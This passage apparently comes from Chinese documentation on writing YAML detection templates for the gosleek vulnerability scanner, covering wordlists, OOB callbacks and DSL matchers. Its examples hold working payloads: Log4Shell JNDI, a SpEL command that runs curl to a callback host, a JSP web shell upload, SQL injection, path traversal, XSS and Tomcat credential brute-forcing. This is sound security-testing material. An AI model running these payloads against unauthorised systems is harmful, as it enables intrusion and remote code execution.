| `timestamp` | `timestamp()` | `{{timestamp}}` → `1723872000` | Unix 时间戳 |
| `date` | `date(format?)` | `{{date("2006-01-02")}}` | 格式化日期 |

**UUID**：
```yaml
{{uuid}}    # 生成 UUID v4
```

### 9.5 $$ 转义机制

在 JNDI 等 payload 中，`${...}` 不应被占位符引擎解析：

```yaml
# 错误：${ 会被解析为占位符
raw: |
  ${jndi:ldap://{{oob}}}

# 正确：$$ 转义为字面量 $
raw: |
  $${jndi:ldap://{{oob}}}
```

**转义流程**：
1. `$$` → 内部占位符 `\x00DOLLAR\x00`
2. `{{oob}}` → 正常替换为 OOB 地址
3. 内部占位符 → 还原为 `$`

结果：`${jndi:ldap://abc123.ceye.io}`

---

## 10. Wordlist 字典爆破

### 10.1 基本用法

```yaml
http:
  - raw: |
      GET /{{word}} HTTP/1.1
      Host: {{Hostname}}
    wordlist:
      - key: "word"             # 占位符 key（不含花括号）
        path: "wordlists/dirs.txt"
        encoding: "url"         # 可选：url/base64/hex
    matchers:
      - type: status
        status: [200, 301, 302]
```

**工作原理**：
1. 读取字典文件，逐行替换 `{{word}}`
2. 每行生成一个请求
3. 每个请求独立匹配

### 10.2 多字典笛卡尔积

```yaml
http:
  - raw: |
      POST /login HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/json

      {"user":"{{username}}","pass":"{{password}}"}
    wordlist:
      - key: "username"
        path: "wordlists/users.txt"
      - key: "password"
        path: "wordlists/passwords.txt"
```

**工作原理**：每个 `{{username}}` 与每个 `{{password}}` 组合，生成笛卡尔积。

**笛卡尔积限制**：默认最大组合数为 10000（可通过 `config.yaml` 的 `max-cartesian-products` 调整）。超出限制时跳过该请求块并输出 warning。

```yaml
# config.yaml 中可调整上限
max-cartesian-products: 50000
```

### 10.3 WordlistConfig 字段

```yaml
wordlist:
  - key: "word"                 # 必填：占位符 key（不含花括号）
    path: "wordlists/dirs.txt"  # 必填：字典文件路径
    encoding: ""                # 可选：url/base64/hex
```

### 10.4 编码选项

| encoding | 说明 | 示例 |
|----------|------|------|
| (空) | 不做处理 | `admin` → `admin` |
| `url` | URL 编码 | `../` → `%2e%2e%2f` |
| `base64` | Base64 编码 | `admin` → `YWRtaW4=` |
| `hex` | 十六进制编码 | `admin` → `61646d696e` |

### 10.5 字典文件格式

```
# 注释行以 # 开头，会被跳过
# 空行也会被跳过
admin
root
administrator
test
user
```

---

## 11. 指纹预过滤

### 11.1 基本用法

```yaml
fingerprints:
  - title: "Apache Tomcat"
    header:
      - "Server: Apache-Coyote"
  - title: "Spring Boot"
    header:
      - "X-Application-Context"
```

### 11.2 FingerprintRule 字段

```yaml
fingerprints:
  - title: "目标标题"     # 匹配响应 <title> 标签（子串匹配）
    header:              # 匹配响应头（格式：["Key: value-pattern"]）
      - "Server: Apache"
      - "X-Powered-By: PHP"
```

### 11.3 匹配规则

- 返回 nil → 不做指纹过滤，所有目标都检测
- 返回非空 → 目标匹配**任一**规则才执行检测
- 规则之间是 OR 关系，规则内的 title/header 也是 OR 关系

### 11.4 使用场景

适用于只针对特定技术栈的检测：

```yaml
id: spring-actuator-unauth
name: Spring Boot Actuator 未授权
severity: high
tags: [springboot, actuator]
fingerprints:
  - header:
      - "X-Application-Context"
  - title: "Spring Boot"
http:
  - path: ["/actuator", "/actuator/env"]
    matchers:
      - type: status
        status: [200]
```

---

## 12. OOB 带外验证

### 12.1 基本原理

OOB（Out-of-Band）验证用于检测无回显漏洞：

```
┌──────────┐    ① 触发     ┌──────────┐    ② DNS/HTTP 请求   ┌──────────┐
│  扫描器   │ ──────────▶ │  目标    │ ──────────────────▶ │ OOB 服务 │
│          │               │          │                     │ (ceye/   │
│  ③ 查询  │ ◀────────── │          │                     │ dnslog/  │
│  ④ 匹配  │               │          │                     │ cb.red)  │
└──────────┘               └──────────┘                     └──────────┘
```

1. **触发**：发送 payload，使目标服务器向 OOB 域名发起 DNS/HTTP 请求
2. **等待**：延迟 N 秒，等待回调发生
3. **查询**：调用 OOB Provider API 查询记录
4. **匹配**：检查记录中是否包含唯一的 label

### 12.2 三种 Provider

#### ceye

```bash
# 命令行
gosleek scan -t http://example.com --oob --oob-provider ceye \
  --ceye-key <token> --ceye-domain <domain>
```

```yaml
# config.yaml
oob:
  enabled: true
  provider: ceye
  ceye:
    token: "your-token"
    domain: "your.ceye.io"
```

**API 格式**：
```
GET /v1/records?token={token}&type=dns HTTP/1.1
Host: api.ceye.io
```

响应：
```json
{"meta":{"code":200},"data":[{"name":"label.ceye.io","type":"dns","time":"..."}]}
```

#### dnslog

```bash
gosleek scan -t http://example.com --oob --oob-provider dnslog
```

```yaml
oob:
  enabled: true
  provider: dnslog
  dnslog: {}
```

**无需配置**，自动获取子域名和 PHPSESSID。

API：
- `GET /getdomain.php` → 获取子域名 + PHPSESSID
- `GET /getrecords.php?domain={domain}` → 查询记录（Host: 47.244.138.18）

响应：`[["domain","ip","time"],...]`

#### callbackred

```bash
gosleek scan -t http://example.com --oob --oob-provider callbackred --allow-external-hosts
```

```yaml
oob:
  enabled: true
  provider: callbackred
  callbackred: {}
```

**无需配置**，自动获取 key。

API：
- `GET /get` → 获取 key + subdomain
- `POST /` with `key={token}` → 查询记录（Host: callback.red）

响应：`{"code":200,"data":[{"subdomain":"label.callback.red","type":"dns"}]}`

### 12.3 oob-provider 字段（模板级）

模板可声明自己的 provider，与全局配置独立：

```yaml
id: CVE-2022-22963-dnslog
oob-provider: dnslog    # 此模板硬编码使用 dnslog，不受全局配置影响
```

**使用场景**：
- 模板的 verify 步骤调用了特定 provider 的 API
- 全局配置与模板期望的 provider 不同时

### 12.4 OOB 验证模板完整示例

```yaml
id: oob-test
name: OOB Test
severity: critical
tags: [oob, test]
oob-provider: ceye

workflow:
  - name: trigger
    http:
      - raw: |
          GET /ping?url=http://{{oob}} HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200]

  - name: verify-dns
    requires: [trigger]
    delay: 5
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and
```

---

## 13. DSL 表达式

DSL（Domain Specific Language）提供灵活的条件判断能力。

### 13.1 基本语法

```yaml
dsl: ["status_code == 200 && contains(body, 'vulnerable')"]
```

多个 dsl 条目之间是 AND 关系（全部通过才匹配）。

### 13.2 内置变量

| 变量 | 类型 | 说明 | 示例值 |
|------|------|------|--------|
| `status_code` | int | HTTP 状态码 | `200` |
| `body` | string | 响应正文 | `"Hello World"` |
| `header` | string | 响应头（拼接） | `"Server: nginx\n..."` |
| `all` | string | 响应头 + 正文 | |
| `response_time` | float | 响应时间（秒） | `0.523` |
| `content_length` / `len` | int | 响应体长度 | `1234` |
| 自定义变量 | string | Extractor 提取的变量 | `{{csrf_token}}` |

### 13.3 运算符

| 运算符 | 说明 | 示例 |
|--------|------|------|
| `==` | 等于 | `status_code == 200` |
| `!=` | 不等于 | `status_code != 404` |
| `>` | 大于 | `response_time > 5` |
| `<` | 小于 | `content_length < 1000` |
| `>=` | 大于等于 | `response_time >= 1` |
| `<=` | 小于等于 | `content_length <= 50000` |
| `&&` | 逻辑与 | `a && b` |
| `\|\|` | 逻辑或 | `a \|\| b` |
| `!` | 逻辑非 | `!contains(body, 'error')` |
| `()` | 括号 | `(a || b) && c` |

### 13.4 内置函数

| 函数 | 签名 | 示例 | 说明 |
|------|------|------|------|
| `contains` | `contains(var, 'str')` | `contains(body, 'admin')` | 子串匹配 |
| `contains_any` | `contains_any(var, 'a', 'b')` | `contains_any(body, 'root', 'admin')` | 任一匹配 |
| `contains_all` | `contains_all(var, 'a', 'b')` | `contains_all(body, 'admin', 'panel')` | 全部匹配 |
| `equals` | `equals(var, 'val')` | `equals(status_code, '200')` | 精确相等 |
| `regex` / `matches` | `regex(var, 'pattern')` | `regex(body, 'CVE-\d+-\d+')` | 正则匹配 |
| `starts_with` / `has_prefix` | `starts_with(var, 'pre')` | `starts_with(header, 'HTTP/')` | 前缀匹配 |
| `ends_with` / `has_suffix` | `ends_with(var, 'suf')` | `ends_with(body, '.exe')` | 后缀匹配 |
| `to_lower_contains` | `to_lower_contains(var, 'word')` | `to_lower_contains(body, 'Admin')` | 不区分大小写匹配 |
| `len` | `len(var)` | `len(body) > 100` | 返回长度 |

### 13.5 DSL 示例

**示例 1：基础条件**
```yaml
dsl: ["status_code == 200"]
```

**示例 2：组合条件**
```yaml
dsl: ["status_code == 200 && contains(body, 'vulnerable')"]
```

**示例 3：排除误报**
```yaml
dsl: ["!contains(body, 'error') && len(body) > 100"]
```

**示例 4：正则匹配**
```yaml
dsl: ["regex(body, 'CVE-\\d{4}-\\d{4,}')"]
```

**示例 5：时间盲注**
```yaml
dsl: ["response_time > 5"]
```

**示例 6：多条件组合**
```yaml
dsl: ["(status_code == 200 || status_code == 302) && contains(body, 'Welcome')"]
```

**示例 7：多条目（AND 关系）**
```yaml
dsl:
  - "status_code == 200"
  - "contains(body, 'admin')"
  - "!contains(body, '404')"
```

---

## 14. 高级特性

### 14.1 stop-at-first-match

```yaml
# 模板级：所有请求中任一匹配即停止
stop-at-first-match: true

# 请求级：此请求命中后停止发送同请求块的后续请求
http:
  - raw: |...
    stop-at-first-match: true
```

### 14.2 run-if 条件执行

```yaml
http:
  - raw: |
      GET /admin HTTP/1.1
      Host: {{Hostname}}
    run-if: "{{status_code} == 200}"    # 仅当前一请求返回 200 时执行
```

**跳过规则**：
- 值为空字符串 → 跳过
- 值为 `false`、`0`、`"false"` → 跳过
- 包含未解析的 `{{...}}` → 跳过
- 其他值 → 执行

### 14.3 probe 探测模式

```yaml
http:
  - raw: |
      GET / HTTP/1.1
      Host: {{Hostname}}
    probe: true
    extractors:
      - name: "server"
        type: "regex"
        part: "header"
        regex: ["Server:\\s*(\\S+)"]
        group: 1
```

`probe: true` 的请求：
- **extractor 仍然运行**：可从响应中提取数据供后续步骤使用
- matcher 结果**不计入**最终判定
- 仅用于探测/收集信息，不影响漏洞判断

### 14.4 全局请求头注入

```bash
gosleek scan -t http://example.com -H "X-Auth: token" -H "X-Client: gosleek"
```

全局 Header 自动注入到每个请求的 header 块末尾，不覆盖模板中已有的同名 Header。

### 14.5 路径列表

```yaml
http:
  - path:
      - "/admin"
      - "/administrator"
      - "/admin/login"
      - "/manager"
      - "/console"
      - "/dashboard"
      - "/wp-admin"
      - "/phpmyadmin"
    method: "GET"
    matchers:
      - type: status
        status: [200, 301, 302]
```

**行为**：对列表中的**每个路径**独立发送请求，每个请求独立匹配。8 个路径 = 8 个请求，结果按 `matchers-condition` 聚合（默认 OR：任一匹配即成功）。

**适用于**：目录枚举、多路径探测、批量端点扫描。

### 14.6 全局 Header 注入机制

通过 `-H` 参数注入的全局 Header 会根据请求模式以不同方式合并：

**raw 模式**：全局 Header 插入到请求的 header 块末尾（`Content-Type` 等已有头部之后）：
```
GET /path HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0
Content-Type: application/json

X-Auth: token          ← 全局 Header 追加到这里
X-Client: gosleek      ← 全局 Header 追加到这里

{"key": "value"}
```

**path 模式**：全局 Header 与请求级 Header 合并，优先级：请求级 > 全局级（同名 Header 不覆盖）：
```yaml
http:
  - path: ["/api"]
    headers:
      "X-Custom": "req-value"    # 请求级，优先级高
    method: "POST"
```
加上 `-H "X-Custom: global-value" -H "X-Global: value"`：
- `X-Custom` → 使用 `req-value`（请求级优先）
- `X-Global` → 使用 `value`（全局注入）

**注意事项**：
- 全局 Header 不会覆盖模板中已定义的同名 Header
- raw 模式的 Header 和全局 Header 分开，不会冲突
- path 模式的 Header 和全局 Header 合并，同名时请求级优先

---

## 15. 完整示例

### 15.1 示例 1：简单存在性检测

```yaml
id: directory-listing
name: Directory Listing Enabled
severity: low
tags: [security, directory, listing]
description: 检测 Web 服务器是否启用了目录列表功能

http:
  - path: ["/", "/admin/", "/uploads/"]
    matchers-condition: or
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["Index of /", "Directory listing"]
        case-insensitive: true
```

### 15.2 示例 2：Log4Shell JNDI RCE（OOB）

```yaml
id: CVE-2021-44228-log4j-rce
name: Apache Log4j2 RCE (JNDI Injection)
description: |
  Apache Log4j2 存在 JNDI 注入漏洞，攻击者可构造特殊日志消息
  触发远程代码执行。本模板使用 OOB 验证。
severity: critical
tags: [cve, rce, jndi, log4j, oob]
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
classification:
  cvss-score: 10.0
  cve-id: CVE-2021-44228
  cwe: CWE-94
oob-provider: ceye

workflow:
  - name: trigger
    http:
      - raw: |
          GET /api/search?q=$${jndi:ldap://{{oob}}/test} HTTP/1.1
          Host: {{Hostname}}
          User-Agent: $${jndi:ldap://{{oob}}}
        matchers:
          - type: status
            status: [200, 500]
        matchers-condition: or

  - name: verify-dns
    requires: [trigger]
    delay: 5
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and

  - name: verify-http
    requires: [trigger]
    delay: 3
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=http HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and
```

### 15.3 示例 3：SQL 时间盲注

```yaml
id: sqli-time-based-blind
name: SQL Injection (Time-Based Blind)
severity: high
tags: [sqli, injection, time-based]
description: 通过时间延迟检测 SQL 时间盲注

http:
  # 基线：正常请求
  - name: baseline
    raw: |
      GET / HTTP/1.1
      Host: {{Hostname}}
    timeout: 30
    matchers:
      - type: dsl
        dsl: ["status_code == 200"]
    extractors:
      - name: baseline_time
        type: regex
        part: "header"
        regex: ["Response-Time:\\s*([0-9.]+)"]
        group: 1

  # 测试：注入 SLEEP
  - name: sleep-payload
    raw: |
      GET /search?id=1' AND SLEEP(5)-- HTTP/1.1
      Host: {{Hostname}}
    timeout: 30
    run-if: "{{baseline_time}}"    # 仅当基线请求成功时执行
    matchers-condition: and
    matchers:
      - type: status
        status: [200, 500]
      - type: time
        time: ">=5"
```

### 15.4 示例 4：Spring Cloud Gateway SpEL RCE

```yaml
id: CVE-2022-22947
name: Spring Cloud Gateway Actuator SpEL RCE
description: |
  Spring Cloud Gateway 2.2.0-2.2.3 和 3.0.0-3.0.1 存在 SpEL 注入漏洞。
  通过 actuator/gateway/routes 端点可注入 SpEL 表达式执行任意命令。
severity: critical
tags: [cve, rce, spel, spring, gateway, actuator]
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-22947"
classification:
  cvss-score: 6.6
  cve-id: CVE-2022-22947
  cwe: CWE-94

variables:
  route_id: "gs_{{rand_text_alpha(8)}}"

workflow:
  - name: add-route
    http:
      - raw: |
          POST /actuator/gateway/routes/{{route_id}} HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json

          {
            "id": "{{route_id}}",
            "filters": [{
              "name": "AddResponseHeader",
              "args": {
                "name": "Result",
                "value": "{{rand_text_alpha(10)}}"
              }
            }],
            "uri": "http://example.com",
            "order": 0
          }
        matchers:
          - type: status
            status: [201]

  - name: refresh
    requires: [add-route]
    http:
      - raw: |
          POST /actuator/gateway/refresh HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200]

  - name: trigger
    requires: [refresh]
    http:
      - raw: |
          GET /actuator/gateway/routes/{{route_id}} HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200]
          - type: header
            header: ["Result: {{rand_text_alpha(10)}}"]
        matchers-condition: and

  - name: cleanup
    requires: [trigger]
    http:
      - raw: |
          DELETE /actuator/gateway/routes/{{route_id}} HTTP/1.1
          Host: {{Hostname}}
```

### 15.5 示例 5：多 Provider OOB（推荐方式）

```yaml
id: CVE-2022-22963-multi
name: Spring Cloud Function SpEL Injection (Multi-Provider OOB)
description: |
  Spring Cloud Function SpEL 注入漏洞，同时支持 ceye/dnslog/callbackred
  三种 OOB Provider。引擎自动跳过不匹配的 Provider 验证步骤。
severity: critical
tags: [cve, rce, spel, spring, oob]
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-22963"
classification:
  cvss-score: 9.8
  cve-id: CVE-2022-22963
  cwe: CWE-94

workflow:
  - name: trigger
    http:
      - raw: |
          POST /functionRouter HTTP/1.1
          Host: {{Hostname}}
          spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl {{oob}}")
          Content-Type: text/plain

          test
        matchers:
          - type: status
            status: [200, 201, 500, 400, 404, 502]
        matchers-condition: or

  - name: verify-dns-ceye
    requires: [trigger]
    delay: 5
    provider: ceye
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and

  - name: verify-dns-dnslog
    requires: [trigger]
    delay: 5
    provider: dnslog
    http:
      - raw: |
          GET /getrecords.php?domain={{oob}} HTTP/1.1
          Host: 47.244.138.18
          Cookie: PHPSESSID={{oob_token}}
        matchers:
          - type: status
            status: [200]
          - type: json-2darray
            json-2darray-column: 0
            words: ["{{oob_label}}"]
        matchers-condition: and

  - name: verify-dns-callbackred
    requires: [trigger]
    delay: 5
    provider: callbackred
    http:
      - raw: |
          POST / HTTP/1.1
          Host: callback.red
          Content-Type: application/x-www-form-urlencoded

          key={{oob_token}}
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: subdomain
            words: ["{{oob_label}}"]
        matchers-condition: and
```

### 15.6 示例 6：字典爆破（Tomcat Manager）

```yaml
id: tomcat-manager-bypass
name: Apache Tomcat Manager 弱口令检测
severity: critical
tags: [tomcat, rce, auth-bypass, default-password]
description: 使用内置字典爆破 Tomcat Manager 默认凭据

http:
  - raw: |
      POST /manager/html HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Authorization: Basic {{base64_encode(concat({{username}}, ':', {{password}}))}}

      .
    wordlist:
      - key: "username"
        path: "wordlists/tomcat-users.txt"
      - key: "password"
        path: "wordlists/tomcat-pass.txt"
        encoding: "base64"
    matchers:
      - type: word
        words: ["Manager Server", "list applications"]
      - type: status
        status: [200]
    matchers-condition: and
```

### 15.7 示例 7：CORS 配置检测

```yaml
id: cors-misconfiguration
name: CORS 跨域配置检测
severity: medium
tags: [security, cors, misconfiguration]
description: 检测跨域资源共享（CORS）配置是否过于宽松

http:
  - method: OPTIONS
    path: ["/"]
    headers:
      "Origin": "https://evil.example.com"
    matchers:
      - type: word
        part: "header"
        words:
          - "Access-Control-Allow-Origin: *"
      - type: dsl
        dsl:
          - "contains(header, 'Access-Control-Allow-Origin') && contains(header, 'evil.example.com')"
    matchers-condition: or
```

### 15.8 示例 8：CSRF Token 缺失检测（DSL）

```yaml
id: csrf-token-missing
name: CSRF Token 缺失检测
severity: low
tags: [security, csrf, form]
description: 检测表单是否缺少 CSRF 保护令牌

http:
  - path: ["/login", "/register", "/profile", "/settings"]
    matchers:
      - type: dsl
        dsl:
          - "!contains(body, 'csrf')"
          - "!contains(body, 'csrf_token')"
          - "!contains(body, '_token')"
          - "!contains(body, 'xsrf')"
          - "!contains(body, 'anti-csrf')"
        condition: "or"
      - type: status
        status: [200]
    matchers-condition: and
```

### 15.9 示例 9：目录遍历检测

```yaml
id: directory-traversal-basic
name: 基础目录穿越检测
severity: high
tags: [security, traversal, lfi]
description: 检测常见的目录穿越漏洞

http:
  - raw: |
      GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
      Host: {{Hostname}}
    matchers:
      - type: regex
        regex: ["root:[x*]:0:0:"]
      - type: word
        words: ["/bin/bash", "/bin/sh"]
    matchers-condition: or
```

### 15.10 示例 10：JWT 认证绕过工作流

```yaml
id: jwt-auth-bypass-workflow
name: JWT Authentication Bypass (Workflow)
severity: high
tags: [jwt, auth, bypass, workflow]
description: 多步骤检测 JWT 认证绕过

variables:
  test-user: "admin"
  test-pass: "admin123"

workflow:
  - name: step1-login
    http:
      - raw: |
          POST /api/login HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json

          {"username":"{{test-user}}","password":"{{test-pass}}"}
        matchers:
          - type: status
            status: [200]
          - type: word
            part: body
            words: ["token", "access_token"]
            condition: or
        extractors:
          - name: jwt-token
            type: regex
            part: body
            group: 1
            regex: ['"token":\\s*"([^"]+)"']

  - name: step2-access-protected
    requires: [step1-login]
    http:
      - raw: |
          GET /api/admin/users HTTP/1.1
          Host: {{Hostname}}
          Authorization: Bearer {{jwt-token}}
        matchers:
          - type: status
            status: [200]
          - type: word
            part: body
            words: ["users", "admin", "list"]
            condition: or
        matchers-condition: and
```

### 15.11 示例 11：SSRF OOB 检测

```yaml
id: ssrf-oob-detection
name: SSRF Detection (OOB)
description: |
  通过注入 OOB 回连地址检测服务端请求伪造 (SSRF)。
  向 url 参数注入 ceye.io 子域名，如果服务器发起了请求，
  ceye.io 会收到 DNS/HTTP 回连记录。
severity: critical
tags: [ssrf, oob, rce]

workflow:
  - name: trigger
    http:
      - raw: |
          GET /proxy?url=http://{{oob}} HTTP/1.1
          Host: {{Hostname}}
        matchers:
          - type: status
            status: [200, 302, 301, 403, 500, 502]
        matchers-condition: or

  - name: verify-dns
    requires: [trigger]
    delay: 5
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=dns HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and

  - name: verify-http
    requires: [verify-dns]
    delay: 3
    http:
      - raw: |
          GET /v1/records?token={{oob_token}}&type=http HTTP/1.1
          Host: api.ceye.io
        matchers:
          - type: status
            status: [200]
          - type: json-word
            json-path: data
            json-field: name
            words: ["{{oob_label}}"]
        matchers-condition: and
```

### 15.12 示例 12：文件上传检测

```yaml
id: file-upload-test
name: 文件上传漏洞检测
severity: high
tags: [upload, rce, security]
description: 检测是否存在文件上传漏洞

variables:
  upload_filename: "{{rand_text_alpha(8)}}.jsp"
  upload_content: "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"

http:
  - raw: |
      POST /upload HTTP/1.1
      Host: {{Hostname}}
      Content-Type: multipart/form-data; boundary=----gosleekFormBoundary

      ------gosleekFormBoundary
      Content-Disposition: form-data; name="file"; filename="{{upload_filename}}"
      Content-Type: application/octet-stream

      {{upload_content}}
      ------gosleekFormBoundary--

    matchers:
      - type: status
        status: [200, 201]
      - type: word
        words: ["uploaded", "success", "filename"]
        case-insensitive: true
    matchers-condition: or
```

### 15.13 示例 13：多路径探测

```yaml
id: admin-panel-detect
name: 管理面板探测
severity: info
tags: [security, enumeration, admin]
description: 探测常见的管理面板入口

http:
  - path:
      - "/admin"
      - "/administrator"
      - "/admin/login"
      - "/manager"
      - "/console"
      - "/dashboard"
      - "/wp-admin"
      - "/phpmyadmin"
    method: "GET"
    matchers-condition: or
    matchers:
      - type: status
        status: [200, 301, 302]
      - type: word
        words:
          - "login"
          - "admin"
          - "dashboard"
          - "password"
        case-insensitive: true
    matchers-condition: or
```

### 15.14 示例 14：XSS 反射型检测

```yaml
id: xss-reflected-basic
name: 反射型 XSS 检测
severity: medium
tags: [security, xss, reflected]
description: 检测反射型 XSS 漏洞

http:
  - raw: |
      GET /search?q=<script>alert(1)</script> HTTP/1.1
      Host: {{Hostname}}
    matchers:
      - type: word
        words: ["<script>alert(1)</script>"]
        case-insensitive: true
      - type: regex
        regex: ["<script[^>]*>alert\\(1\\)"]
    matchers-condition: or
```

### 15.15 示例 15：文件包含检测

```yaml
id: file-include-basic
name: 文件包含检测
severity: high
tags: [security, lfi, rfi]
description: 检测本地/远程文件包含漏洞

http:
  - raw: |
      GET /page?file=../../../../etc/passwd HTTP/1.1
      Host: {{Hostname}}
    matchers:
      - type: regex
        regex: ["root:[x*]:0:0:"]
      - type: word
        words: ["/bin/bash", "/bin/sh"]
    matchers-condition: or
```

---

## 16. 编写步骤指南

### 16.1 编写流程

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│  1. 理解漏洞 │───▶│  2. 设计请求 │───▶│  3. 编写 YAML│───▶│  4. 验证测试 │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
       │                   │                   │                   │
       ▼                   ▼                   ▼                   ▼
  阅读 CVE 文档      构造探测请求      填写 YAML 模板      validate + scan
  了解利用方式      确定匹配特征      测试占位符替换     修正错误
```

### 16.2 详细步骤

#### Step 1：理解漏洞原理

1. 阅读 CVE 描述和技术细节
2. 了解漏洞的触发条件和利用方式
3. 确定是「有回显」还是「无回显」漏洞

**有回显漏洞**：响应中包含特征（关键词、状态码、响应头等）
**无回显漏洞**：需要通过 OOB 或时间延迟判断

#### Step 2：设计探测请求

**有回显漏洞**：
1. 构造触发 payload
2. 确定响应中的特征（关键词、状态码、响应头等）
3. 设计排除误报的规则

**无回显漏洞（OOB）**：
1. 构造触发 payload（使目标向 OOB 域名发起请求）
2. 确定 OOB Provider（ceye/dnslog/callbackred）
3. 设计验证请求（查询 OOB API）
4. 设置合理的 delay 时间（3-10 秒）

**有回显但需多步**：
1. 设计步骤 1：获取必要数据（token、cookie 等）
2. 设计步骤 2：利用步骤 1 的数据触发漏洞
3. 设计步骤 3：验证结果

#### Step 3：编写 YAML 模板

1. 填写元数据（id, name, description, severity, tags）
2. 编写 HTTP 请求（raw 或 path 模式）
3. 定义匹配规则（matcher）
4. 如有需要，添加提取器（extractor）
5. 如无回显，设计工作流（workflow）

#### Step 4：验证与测试

```bash
# 语法校验
gosleek validate templates/your-template.yaml

# 扫描测试
gosleek scan -t http://test-target.com -id your-template-id -vv

# 查看日志
cat gosleek.log
```

### 16.3 检查清单

- [ ] `id` 唯一且命名规范
- [ ] `severity` 正确（info/low/medium/high/critical）
- [ ] `tags` 包含关键标签
- [ ] 请求能正确触发漏洞
- [ ] matcher 能准确匹配
- [ ] 排除常见误报（negative matcher）
- [ ] OOB 模板正确设置 `oob-provider`
- [ ] 使用 `gosleek validate` 通过校验
- [ ] 在测试环境验证有效

---

## 17. 调试技巧

### 17.1 日志级别

```bash
# 默认：仅显示结果
./gosleek scan -t http://target.com -id my-template

# -v：显示步骤日志
./gosleek scan -t http://target.com -id my-template -v

# -vv：显示完整请求/响应包
./gosleek scan -t http://target.com -id my-template -vv
```

### 17.2 验证模板

```bash
# 校验整个目录
./gosleek validate templates/

# 校验单个文件
./gosleek validate templates/my-template.yaml
```

常见错误：
- `id is required` → 缺少 id 字段
- `invalid matcher type` → matcher type 拼写错误
- `circular dependency detected` → workflow 循环依赖
- `requires references unknown step` → requires 引用的 step 名不存在

### 17.3 占位符替换测试

使用 `-vv` 模式可以看到每个请求的完整内容，包括占位符替换后的结果：

```
[请求] step1 req[0]  GET /api?q=abc123.ceye.io  128 bytes
[响应] step1 req[0]  status=200  0.523s  512 bytes
[匹配] step1 req[0]  PASS  cond=and  types=status,word  evidence="..."
```

### 17.4 OOB 调试

```bash
# 启用 OOB 并查看详细日志
./gosleek scan -t http://target.com -id my-oob-template --oob --oob-provider ceye --ceye-key xxx --ceye-domain xxx.ceye.io -vv
```

关注日志中的：
- `workflow step executing` → 步骤开始执行
- `ceye.io response` → OOB API 响应（-vv 级别）
- `workflow matcher PASS/FAIL` → 匹配结果

---

## 18. 常见问题

### 18.1 yaml: line X: mapping values are not allowed in this context

**原因**：YAML 中 `:` 后面需要空格。

**错误**：
```yaml
header: ["Server:Apache"]
```

**正确**：
```yaml
header: ["Server: Apache"]
```

### 18.2 matchers-condition 未生效

**原因**：请求级的 `matchers-condition` 优先级高于模板级。

**检查**：是否在请求级覆盖了模板级设置。

### 18.3 OOB 验证始终失败

**排查步骤**：
1. 确认 `--oob` 参数已启用
2. 确认 `--allow-external-hosts` 已添加（外部 provider）
3. 检查 provider 配置是否正确
4. 使用 `-vv` 查看详细日志
5. 确认 delay 时间足够（OOB 回调可能需要几秒到几十秒）
6. 确认触发请求成功（status 200/500 等）

### 18.4 占位符未替换

**原因**：占位符名称拼写错误或未定义。

**检查**：
- 内置变量：`{{Hostname}}`、`{{oob}}` 等（注意大小写）
- 自定义变量：在 `variables` 中定义
- Extractor 变量：通过 `name` 字段定义后引用

### 18.5 模板加载失败

**常见原因**：
1. YAML 语法错误 → 使用 `gosleek validate` 检查
2. 缺少必填字段 → 检查 `id`、`name`、`description`、`severity`
3. matcher type 未知 → 检查是否使用了合法类型
4. workflow 循环依赖 → 检查 `requires` 指向

### 18.6 误报处理

```yaml
# 方案 1：添加更精确的 word 匹配
matchers:
  - type: word
    words: ["specific-vulnerability-marker"]

# 方案 2：使用 negative 排除
matchers:
  - type: word
    words: ["error", "not-found"]
    negative: true

# 方案 3：使用指纹预过滤
fingerprints:
  - title: "Vulnerable Application"

# 方案 4：增加更多 matcher 条件
matchers:
  - type: status
    status: [200]
  - type: word
    words: ["vulnerable"]
  - type: size
    size: [">100", "<10000"]
matchers-condition: and
```

---

## 附录 A：YAML 模板完整字段参考

```yaml
# ============ 元数据 ============
id: string                         # 必填：唯一标识
name: string                       # 必填：显示名称
description: string                # 必填：漏洞描述
severity: "info|low|medium|high|critical"  # 必填：严重等级
author: string                     # 可选：作者
tags: [string, ...]                # 可选：标签列表
reference: [string, ...]           # 可选：参考链接

# ============ 分类 ============
classification:                    # 可选
  cvss-score: float
  cve-id: string
  cwe: string

